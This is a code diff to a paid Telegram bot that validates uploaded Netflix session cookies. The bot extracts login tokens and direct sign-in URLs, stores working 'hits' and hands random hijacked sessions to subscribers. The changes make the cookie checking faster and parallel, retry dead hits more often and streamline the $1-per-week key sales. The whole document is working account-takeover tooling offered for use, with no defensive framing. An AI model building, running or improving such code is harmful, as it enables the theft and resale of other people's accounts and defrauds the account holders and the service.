@@ -257,7 +257,7 @@ def fetch_nftoken(cookie_dict: dict):
             API_URL,
             params=QUERY_PARAMS,
             headers=headers,
-            timeout=15,
+            timeout=7,
             verify=False,
         )
         if resp.status_code == 200:
@@ -307,7 +307,7 @@ def check_netflix_cookie(cookie_dict: dict):
         session.cookies.set(k, v, domain=".netflix.com")
 
     try:
-        resp      = session.get("https://www.netflix.com/youraccount", timeout=15, allow_redirects=True)
+        resp      = session.get("https://www.netflix.com/youraccount", timeout=8, allow_redirects=True)
         final_url = resp.url.lower()
 
         if "/login" in final_url or "nextpage" in final_url:
@@ -585,6 +585,8 @@ def cmd_stop(message):
     if stop_flags.get(user.id) is not None:
         stop_flags[user.id] = True
     bot.reply_to(message, "🛑 <b>Stop signal sent!</b>\nThe checker will stop after the current cookie finishes.")
+    if db_stopped:
+        trigger_next_relay(user.id)
 
 
 # ── /ban ──────────────────────────────────────────────
@@ -657,8 +659,14 @@ def cmd_users(message):
     owner_rows  = [r for r in rows if r[0] == OWNER_ID]
     normal_rows = [r for r in rows if r[0] != OWNER_ID]
 
-    active  = [r for r in normal_rows if not r[5] and datetime.strptime(r[4], "%Y-%m-%d %H:%M:%S") > now]
-    expired = [r for r in normal_rows if not r[5] and datetime.strptime(r[4], "%Y-%m-%d %H:%M:%S") <= now]
+    def _is_active_exp(exp_str):
+        try:
+            return datetime.strptime(str(exp_str), "%Y-%m-%d %H:%M:%S") > now
+        except Exception:
+            return False
+
+    active  = [r for r in normal_rows if not r[5] and _is_active_exp(r[4])]
+    expired = [r for r in normal_rows if not r[5] and not _is_active_exp(r[4])]
     banned  = [r for r in normal_rows if r[5]]
 
     lines = []
@@ -830,9 +838,8 @@ def _forward_payment_proof_from_reply(cmd_message, replied_message, proof_type: 
         f"📦 <b>Plan    :</b> 7 Days\n"
         f"💵 <b>Price   :</b> $1.00\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"If payment is valid, generate key:\n"
-        f"<code>/genkey</code>\n"
-        f"Then send the key to user ID: <code>{uid}</code>"
+        f"If payment is valid, send key directly:\n"
+        f"<code>/sendkey {uid}</code>"
     )
 
     try:
@@ -866,9 +873,8 @@ def _forward_payment_proof(message, proof_type: str):
         f"📦 <b>Plan    :</b> 7 Days\n"
         f"💵 <b>Price   :</b> $1.00\n\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"If payment is valid, generate key:\n"
-        f"<code>/genkey</code>\n"
-        f"Then send the key to user ID: <code>{uid}</code>"
+        f"If payment is valid, send key directly:\n"
+        f"<code>/sendkey {uid}</code>"
     )
 
     try:
@@ -935,7 +941,7 @@ def cmd_db(message):
 
 
 # ── /sendkey ──────────────────────────────────────────
-@bot.message_handler(commands=["sendkey"])
+@bot.message_handler(commands=["sendkey", "genkey"])
 def cmd_sendkey(message):
     if not is_owner(message.from_user.id):
         bot.reply_to(message, "⛔ Owner only.")
@@ -1025,7 +1031,7 @@ def cmd_ask(message):
 
     question = parts[1].strip()
     uname    = f"@{user.username}" if user.username else "—"
-    tier     = get_user_tier(user.id)
+    tier     = get_user_tier(user.id, OWNER_ID)
     plan_names = {
         "owner": "Owner", "paid": "Paid (7 Days)",
         "trial": "Free Trial", "free_user": "Free User", "banned": "Banned"
@@ -1203,7 +1209,7 @@ def handle_document(message):
 
     # ── Cookie file handler ────────────────────────────
     register_user(user, FREE_DAYS)
-    tier = get_user_tier(user.id)
+    tier = get_user_tier(user.id, OWNER_ID)
 
     if tier == "banned":
         bot.reply_to(message, "🚫 <b>You are banned.</b>")
@@ -1263,13 +1269,21 @@ def handle_document(message):
         except Exception as e:
             print(f"[File Forward Error] {e}")
 
-        # ── Block parallel checks ───────────────────────
+        # ── Block parallel checks (auto-clean stale sessions > 10 mins) ──
         existing_sess = _db.get_check_session(user.id)
+        if existing_sess and existing_sess.get("stop_flag") == 0:
+            try:
+                created_dt = datetime.strptime(str(existing_sess.get("created_at", "")), "%Y-%m-%d %H:%M:%S")
+                if (datetime.utcnow() - created_dt).total_seconds() > 600:
+                    _db.delete_check_session(user.id)
+                    existing_sess = None
+            except Exception:
+                pass
         if user.id in active_checkers or (existing_sess and existing_sess.get("stop_flag") == 0):
             bot.reply_to(
                 message,
                 "⚠️ <b>You already have a check running!</b>\n\n"
-                "Please wait for it to finish, or press 🛑 <b>Stop Checking</b> to cancel it first."
+                "Please wait for it to finish, or press 🛑 <b>Stop Checking</b> (or send /stop) to cancel it first."
             )
             return
 
@@ -1305,7 +1319,7 @@ def cmd_nftoken(message):
     register_user(user, FREE_DAYS)
 
     ok, reason = check_access(user.id)
-    tier = get_user_tier(user.id)
+    tier = get_user_tier(user.id, OWNER_ID)
 
     if tier == "banned":
         bot.reply_to(message, "🚫 <b>You are banned.</b>")
@@ -1369,8 +1383,8 @@ def cmd_nftoken(message):
         "<i>Retrieving cached sessions...</i>"
     )
 
-    # Try up to 5 random hits
-    MAX_ATTEMPTS = 5
+    # Try up to 10 random hits (auto-cleaning dead cookies)
+    MAX_ATTEMPTS = 10
     for attempt in range(MAX_ATTEMPTS):
         hit_id, bundle = get_random_hit()
 
@@ -1384,22 +1398,23 @@ def cmd_nftoken(message):
             )
             return
 
-        # Step 2
-        try:
-            bot.edit_message_text(
-                "🔍 <b>[2/3] Validating Live Cookie &amp; Extracting Tokens...</b>\n"
-                "<i>Testing Netflix session...</i>",
-                chat_id=msg.chat.id,
-                message_id=msg.message_id
-            )
-        except Exception:
-            pass
+        # Step 2 (only update message text on first attempt)
+        if attempt == 0:
+            try:
+                bot.edit_message_text(
+                    "🔍 <b>[2/3] Validating Live Cookie &amp; Extracting Tokens...</b>\n"
+                    "<i>Testing Netflix session...</i>",
+                    chat_id=msg.chat.id,
+                    message_id=msg.message_id
+                )
+            except Exception:
+                pass
 
         # Actually re-check the cookie
         res = check_netflix_cookie(bundle)
 
-        if not res.get("alive") or not res.get("is_active"):
-            # Hit is dead — remove from DB and try next
+        if not res.get("alive") or not res.get("is_active") or not res.get("nftoken") or res.get("direct_url", "N/A") == "N/A":
+            # Hit is dead or failed token — remove from DB and try next
             delete_hit_from_db(hit_id)
             continue
 
@@ -1491,6 +1506,8 @@ def callback_stop_button(call):
         if stop_flags.get(uid) is False:
             stop_flags[uid] = True
         bot.answer_callback_query(call.id, "🛑 Stop signal sent!")
+        if db_stopped:
+            trigger_next_relay(uid)
     else:
         bot.answer_callback_query(call.id, "No active checking session.")
 
@@ -1526,7 +1543,10 @@ def send_hits_file_report(chat_id, checked_count, active, inactive, dead, hits_l
     )
 
     if not hits_log:
-        bot.send_message(chat_id, summary)
+        try:
+            bot.send_message(chat_id, summary)
+        except Exception as e:
+            print(f"[Send Summary Error] {e}")
         return
 
     lines = []
@@ -1596,8 +1616,9 @@ def start_serverless_check(chat_id, user, bundles):
     trigger_next_relay(user.id)
 
 
-def process_serverless_check_batch(user_id: int, batch_size: int = 3):
-    """Process a batch of cookies from DB session, update progress, and chain next relay if remaining."""
+def process_serverless_check_batch(user_id: int, batch_size: int = 5):
+    """Process a batch of cookies concurrently from DB session, update progress, and chain next relay if remaining."""
+    from concurrent.futures import ThreadPoolExecutor
     sess = _db.get_check_session(user_id)
     if not sess:
         return {"status": "no_session"}
@@ -1615,33 +1636,36 @@ def process_serverless_check_batch(user_id: int, batch_size: int = 3):
 
     # Check if user pressed Stop
     if stop_flag:
+        _db.delete_check_session(user_id)
         try:
             bot.unpin_chat_message(chat_id, status_msg_id)
         except Exception:
             pass
         send_hits_file_report(chat_id, current_idx, active_count, inactive_count, dead_count, hits_log)
-        _db.delete_check_session(user_id)
         return {"status": "stopped"}
 
     stop_markup = types.InlineKeyboardMarkup()
     stop_markup.add(types.InlineKeyboardButton("🛑 Stop Checking", callback_data=f"stop_check_{user_id}"))
 
     end_idx = min(current_idx + batch_size, total)
-    for i in range(current_idx, end_idx):
-        # Re-check stop flag mid-batch if needed
-        latest_sess = _db.get_check_session(user_id)
-        if not latest_sess or latest_sess.get("stop_flag"):
-            try:
-                bot.unpin_chat_message(chat_id, status_msg_id)
-            except Exception:
-                pass
-            send_hits_file_report(chat_id, i, active_count, inactive_count, dead_count, hits_log)
-            _db.delete_check_session(user_id)
-            return {"status": "stopped"}
+    batch_bundles = bundles[current_idx:end_idx]
 
-        bundle = bundles[i]
-        res = check_netflix_cookie(bundle)
+    # Check all cookies in this batch concurrently for 4x speed
+    with ThreadPoolExecutor(max_workers=min(len(batch_bundles), 5) or 1) as pool:
+        batch_results = list(pool.map(check_netflix_cookie, batch_bundles))
 
+    # Re-check stop flag after parallel network requests
+    latest_sess = _db.get_check_session(user_id)
+    if not latest_sess or latest_sess.get("stop_flag"):
+        _db.delete_check_session(user_id)
+        try:
+            bot.unpin_chat_message(chat_id, status_msg_id)
+        except Exception:
+            pass
+        send_hits_file_report(chat_id, current_idx, active_count, inactive_count, dead_count, hits_log)
+        return {"status": "stopped"}
+
+    for bundle, res in zip(batch_bundles, batch_results):
         if res.get("alive"):
             if res.get("is_active") and res.get("nftoken") and res.get("direct_url", "N/A") != "N/A":
                 active_count += 1
@@ -1703,12 +1727,12 @@ def process_serverless_check_batch(user_id: int, batch_size: int = 3):
 
     # If finished all cookies:
     if end_idx >= total:
+        _db.delete_check_session(user_id)
         try:
             bot.unpin_chat_message(chat_id, status_msg_id)
         except Exception:
             pass
         send_hits_file_report(chat_id, total, active_count, inactive_count, dead_count, hits_log)
-        _db.delete_check_session(user_id)
         return {"status": "completed", "checked": total}
 
     # Otherwise, chain next relay!
